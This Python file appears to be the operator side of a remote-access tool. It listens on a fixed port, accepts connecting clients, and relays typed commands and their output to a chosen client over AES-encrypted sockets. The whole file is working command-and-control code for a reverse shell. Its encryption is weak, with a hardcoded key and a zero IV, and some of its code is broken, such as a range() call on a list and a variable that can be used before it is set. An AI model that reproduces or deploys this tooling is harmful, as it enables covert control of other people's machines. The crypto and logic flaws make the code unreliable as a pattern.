import base64
import os
import socket
import sys
import time

from Cryptodome.Cipher import AES

class Server:
    def __init__(self):
        self.encode_aes = lambda crypt_str, plain_str: base64.b64encode(crypt_str.encrypt(plain_str.encode()))
        self.decode_aes = lambda crypt_str, encrypt_str: crypt_str.decrypt(base64.b64decode(encrypt_str)).decode()

        if os.name == 'posix':
            clear_command = 'clear'
        elif os.name == 'nt':
            clear_command = 'cls'
        self.clear = lambda: os.system(clear_command)

        self.secret = 'Ac0uIRx1XsMvoAEQ'

        self.active = False
        self.clients = []
        self.socks = []

        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.bind(('0.0.0.0', 10234))
        self.server_sock.listen(128)

    def __del__(self):
        for i in range(self.socks):
            for i in range(len(self.socks)):
                self.send(self.socks[i], 'quit')
                self.socks[i].close()
        self.server_sock.close()

    def send(self, sock, cmd, end="SSGSEMINAR"):
        cipher = AES.new(self.secret.encode(), AES.MODE_CFB, '0000000000000000'.encode())
        sock.sendall(self.encode_aes(cipher, cmd+end))
    
    def recv(self, sock, end="SSGSEMINAR"):
        cipher = AES.new(self.secret.encode(), AES.MODE_CFB, '0000000000000000'.encode())
        recv_data = sock.recv(1024)
        data = ''
        while True:
            decrypted = self.decode_aes(cipher, recv_data)
            data += decrypted
            if data.endswith(end):
                break
            else:
                recv_data = sock.recv(1024)
        return data[:-len(end)]

    def refresh(self):
        self.clear()
        print('[*] Listening for clients...')
        if len(self.clients) > 0:
            for i in range(0, len(self.clients)):
                print('[%d] Client: %s' % (i, self.clients[i]))
        else:
            print('[+] ...')

        print('---')

    def disconnect(self, number):
        self.socks[number].close()
        time.sleep(1)
        self.socks.remove(self.socks[number])
        self.clients.remove(self.clients[number])
        self.active = False

def main():
    server = Server()
    while True:
        server.refresh()
        sock, addr = server.server_sock.accept()

        if(sock):
            server.socks.append(sock)
            server.clients.append(str(addr))

        server.refresh()

        user_input = input('\nEnter client number(-1 is exit): ')

        if user_input == '-1':
            print('[!] Exiting...')
            del server
            sys.exit()
        
        server.clear()

        server.active = True
        interactive_sock = server.socks[int(user_input)]
        server.send(interactive_sock, 'interactive')
        print('[*] Interactive client %s' % user_input)

        while server.active:
            try:
                time.sleep(5)
                data = server.recv(interactive_sock)
            except:
                server.disconnect(int(user_input))
                server.refresh()
                print('[!] Client %s disconnected...' % user_input)
                break

            if data == 'quit':
                server.disconnect(int(user_input))
                # server.refresh()
                break
            elif len(data) > 0:
                sys.stdout.write(data)
                nextcmd = input()

            if not len(nextcmd):
                pass
            else:
                server.send(interactive_sock, nextcmd)

if __name__ == '__main__':
    main()